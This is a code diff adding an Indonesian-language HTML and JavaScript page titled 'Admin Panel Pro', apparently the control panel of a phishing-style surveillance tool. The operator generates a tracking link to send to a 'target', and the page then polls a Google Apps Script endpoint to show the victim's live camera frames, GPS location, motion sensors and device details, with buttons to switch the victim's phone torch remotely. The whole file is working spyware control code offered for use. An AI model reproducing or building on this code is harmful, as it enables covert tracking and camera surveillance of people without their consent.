@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎯 Admin Panel Pro | Target Manager</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0e27;
+            color: #fff;
+            padding: 20px;
+        }
+        .header {
+            background: linear-gradient(135deg, #1a1f3a, #0a0e27);
+            padding: 20px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(102,126,234,0.3);
+        }
+        h1 { font-size: 24px; margin-bottom: 5px; }
+        .subtitle { font-size: 12px; color: #8b8fb0; }
+        .id-section {
+            background: rgba(102,126,234,0.1);
+            padding: 20px;
+            border-radius: 16px;
+            margin-bottom: 20px;
+        }
+        .id-section label { font-weight: 600; display: block; margin-bottom: 10px; }
+        .id-input-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .id-input-group input {
+            flex: 2;
+            padding: 12px;
+            border-radius: 12px;
+            border: 1px solid #667eea;
+            background: #1a1f3a;
+            color: white;
+            font-size: 14px;
+        }
+        .id-input-group button {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border: none;
+            padding: 12px 20px;
+            border-radius: 12px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .link-preview {
+            background: #1a1f3a;
+            padding: 12px;
+            border-radius: 12px;
+            margin-top: 15px;
+            font-size: 12px;
+            word-break: break-all;
+            border: 1px solid #667eea;
+        }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .stat-card {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(102,126,234,0.2);
+            border-radius: 16px;
+            padding: 15px;
+            text-align: center;
+        }
+        .stat-number { font-size: 28px; font-weight: 800; color: #667eea; }
+        .stat-label { font-size: 11px; color: #8b8fb0; margin-top: 5px; }
+        .action-bar {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .action-btn {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(102,126,234,0.2);
+            padding: 10px 18px;
+            border-radius: 10px;
+            color: #fff;
+            cursor: pointer;
+        }
+        .target-card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(102,126,234,0.2);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 20px;
+            animation: fadeIn 0.3s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .target-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            flex-wrap: wrap;
+        }
+        .target-name { font-weight: 700; color: #667eea; }
+        .target-time { font-size: 11px; color: #8b8fb0; }
+        .live-frame {
+            background: #000;
+            border-radius: 16px;
+            overflow: hidden;
+            margin: 15px 0;
+            text-align: center;
+            min-height: 180px;
+        }
+        .live-frame img { max-width: 100%; }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            font-size: 13px;
+            flex-wrap: wrap;
+        }
+        .info-label { color: #8b8fb0; }
+        .info-value { font-weight: 500; }
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+        .premium-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border: none;
+            padding: 10px 18px;
+            border-radius: 12px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            flex: 1;
+        }
+        .torch-btn { background: linear-gradient(135deg, #ff9800, #f5576c); }
+        .location-link { color: #667eea; text-decoration: none; }
+        .empty-state { text-align: center; padding: 50px; color: #8b8fb0; }
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #28a745;
+            padding: 12px 20px;
+            border-radius: 12px;
+            animation: slideIn 0.3s;
+            z-index: 1000;
+        }
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        @media (max-width: 768px) {
+            body { padding: 15px; }
+            .id-input-group { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>🎯 Admin Panel Pro</h1>
+    <p class="subtitle">Real-time Target Monitoring | Full Remote Control</p>
+</div>
+
+<div class="id-section">
+    <label>🔑 Target ID</label>
+    <div class="id-input-group">
+        <input type="text" id="targetIdInput" placeholder="Masukkan ID target atau generate baru...">
+        <button onclick="setTargetId()">Set ID</button>
+        <button onclick="generateNewId()">🆕 Generate ID Baru</button>
+    </div>
+    <div class="link-preview" id="linkPreview">
+        Link akan muncul setelah generate ID
+    </div>
+</div>
+
+<div class="stats-grid">
+    <div class="stat-card"><div class="stat-number" id="statTotal">0</div><div class="stat-label">Total Target</div></div>
+    <div class="stat-card"><div class="stat-number" id="statOnline">0</div><div class="stat-label">Online</div></div>
+    <div class="stat-card"><div class="stat-number" id="statShake">0</div><div class="stat-label">Goyangan</div></div>
+</div>
+
+<div class="action-bar">
+    <button class="action-btn" onclick="refreshData()">🔄 Refresh</button>
+    <button class="action-btn" onclick="exportData()">📥 Export JSON</button>
+    <button class="action-btn" onclick="clearData()" style="color:#ff6b6b;">🗑️ Hapus Semua</button>
+</div>
+
+<div id="targetContainer">
+    <div class="empty-state">
+        <div style="font-size: 60px;">📭</div>
+        <h3>Belum ada target</h3>
+        <p>Generate ID dan kirim link ke target</p>
+    </div>
+</div>
+
+<script>
+    // ========== KONFIGURASI ==========
+    // ⚠️ GANTI DENGAN URL APPS SCRIPT LU! ⚠️
+    const API_URL = "https://script.google.com/macros/s/AKfycbxxByXzO1qVSXJEXSaEcwATyLGJ_pWWfl7o0IJIncUIEWpIr-TvoFg8DlVXFaHoLd-27w/exec";
+    
+    let currentId = localStorage.getItem('admin_target_id') || '';
+    let refreshInterval = null;
+    let lastDataHash = '';
+    
+    // Generate ID baru
+    function generateNewId() {
+        const newId = 'TGT-' + Date.now() + '-' + Math.random().toString(36).substr(2, 8);
+        document.getElementById('targetIdInput').value = newId;
+        setTargetId();
+    }
+    
+    // Set ID target
+    function setTargetId() {
+        currentId = document.getElementById('targetIdInput').value.trim();
+        if(!currentId) {
+            alert('Masukkan ID target!');
+            return;
+        }
+        localStorage.setItem('admin_target_id', currentId);
+        
+        // Update link preview
+        const baseUrl = window.location.href.split('admin-new.html')[0];
+        const targetLink = `${baseUrl}target-new.html?id=${currentId}`;
+        document.getElementById('linkPreview').innerHTML = `🔗 Link Target: <br><span style="color:#667eea;">${targetLink}</span>`;
+        
+        // Load data
+        loadTargetData();
+        
+        // Start auto refresh
+        if(refreshInterval) clearInterval(refreshInterval);
+        refreshInterval = setInterval(loadTargetData, 5000);
+        
+        showNotification(`✅ ID set: ${currentId}`);
+    }
+    
+    // Load data dari API
+    async function loadTargetData() {
+        if(!currentId) return;
+        
+        try {
+            const response = await fetch(`${API_URL}?id=${encodeURIComponent(currentId)}`);
+            const data = await response.json();
+            
+            if(data && !data.error && data.length > 0) {
+                renderTarget(data[0]);
+                updateStats(data[0]);
+            } else {
+                renderEmpty('Belum ada data dari target. Kirim link ke target terlebih dahulu.');
+            }
+        } catch(e) {
+            console.log("Error load:", e);
+            renderEmpty('Error mengambil data. Pastikan API URL benar.');
+        }
+    }
+    
+    // Update statistik
+    function updateStats(target) {
+        document.getElementById('statTotal').innerText = target.id ? 1 : 0;
+        const isOnline = (new Date() - new Date(target.timestamp)) < 15000;
+        document.getElementById('statOnline').innerText = isOnline ? 1 : 0;
+        document.getElementById('statShake').innerText = target.shake ? 1 : 0;
+    }
+    
+    // Render target card
+    function renderTarget(target) {
+        const container = document.getElementById('targetContainer');
+        const hasCamera = target.cameraFrame && target.cameraFrame.length > 100;
+        const isOnline = (new Date() - new Date(target.timestamp)) < 15000;
+        
+        container.innerHTML = `
+            <div class="target-card">
+                <div class="target-header">
+                    <div class="target-name">📱 ${target.deviceName || 'Unknown Device'} ${isOnline ? '🟢' : '⚫'}</div>
+                    <div class="target-time">🕐 ${target.waktu || '-'}</div>
+                </div>
+                
+                <div class="live-frame">
+                    ${hasCamera ? 
+                        `<img src="${target.cameraFrame}" alt="Live cam" id="liveCamImg">` : 
+                        '<div style="padding: 40px; color:#666;">📷 Menunggu kamera aktif...</div>'}
+                </div>
+                
+                <div class="info-row">
+                    <span class="info-label">📍 Lokasi:</span>
+                    <span class="info-value">
+                        ${target.lat ? 
+                            `<a href="https://www.google.com/maps?q=${target.lat},${target.lng}" target="_blank" class="location-link">
+                                🗺️ ${target.lat.toFixed(4)}, ${target.lng.toFixed(4)}
+                            </a>` : 
+                            '⏳ Menunggu...'}
+                    </span>
+                </div>
+                
+                <div class="info-row">
+                    <span class="info-label">⚡ Senter:</span>
+                    <span class="info-value" id="torchStatusDisplay">${target.torch ? '🔦 Menyala' : '💡 Mati'}</span>
+                </div>
+                
+                <div class="info-row">
+                    <span class="info-label">🔄 Gyroscope:</span>
+                    <span class="info-value">X:${target.gyroX?.toFixed(1) || 0} Y:${target.gyroY?.toFixed(1) || 0} Z:${target.gyroZ?.toFixed(1) || 0}</span>
+                </div>
+                
+                <div class="info-row">
+                    <span class="info-label">🔔 Goyangan:</span>
+                    <span class="info-value">${target.shake ? '✅ Terdeteksi!' : '⏳ Menunggu...'}</span>
+                </div>
+                
+                <div class="info-row">
+                    <span class="info-label">🖥️ Device:</span>
+                    <span class="info-value" style="font-size: 11px;">${target.screenSize || '-'} | ${(target.userAgent || '').substring(0, 50)}...</span>
+                </div>
+                
+                <div class="button-group">
+                    <button class="premium-btn torch-btn" onclick="remoteTorch(true)">🔦 Nyalakan Senter</button>
+                    <button class="premium-btn" onclick="remoteTorch(false)">💡 Matikan Senter</button>
+                </div>
+            </div>
+        `;
+        
+        // Auto refresh live frame
+        if(hasCamera && target.cameraFrame) {
+            const img = document.getElementById('liveCamImg');
+            if(img) {
+                img.src = target.cameraFrame + '?t=' + Date.now();
+            }
+        }
+    }
+    
+    function renderEmpty(msg) {
+        document.getElementById('targetContainer').innerHTML = `
+            <div class="empty-state">
+                <div style="font-size: 60px;">📭</div>
+                <h3>${msg || 'Belum ada target'}</h3>
+                <p style="margin-top: 10px;">ID: ${currentId || 'Belum diset'}</p>
+            </div>
+        `;
+    }
+    
+    // Remote control senter
+    async function remoteTorch(on) {
+        try {
+            await fetch(API_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    id: currentId,
+                    torch: on,
+                    timestamp: new Date().toISOString()
+                })
+            });
+            showNotification(`⚡ Perintah senter ${on ? 'MENYALA' : 'MATI'} dikirim`);
+            setTimeout(() => loadTargetData(), 1000);
+        } catch(e) {
+            console.log("Remote error:", e);
+        }
+    }
+    
+    function showNotification(msg) {
+        const notif = document.createElement('div');
+        notif.className = 'notification';
+        notif.innerHTML = msg;
+        document.body.appendChild(notif);
+        setTimeout(() => notif.remove(), 3000);
+    }
+    
+    function refreshData() { loadTargetData(); showNotification('🔄 Data di-refresh'); }
+    
+    function exportData() {
+        const data = { id: currentId, timestamp: new Date().toISOString() };
+        const dataStr = JSON.stringify(data, null, 2);
+        const blob = new Blob([dataStr], {type: 'application/json'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `target_${currentId}_${Date.now()}.json`;
+        a.click();
+        URL.revokeObjectURL(url);
+    }
+    
+    function clearData() {
+        if(confirm('⚠️ PERINGATAN! Hapus data target ini? ⚠️')) {
+            showNotification('🗑️ Data dihapus (permanen)');
+            renderEmpty('Data telah dihapus');
+        }
+    }
+    
+    // Load ID yang tersimpan
+    const savedId = localStorage.getItem('admin_target_id');
+    if(savedId) {
+        document.getElementById('targetIdInput').value = savedId;
+        setTargetId();
+    } else {
+        generateNewId();
+    }
+</script>
+</body>
+                        </html>
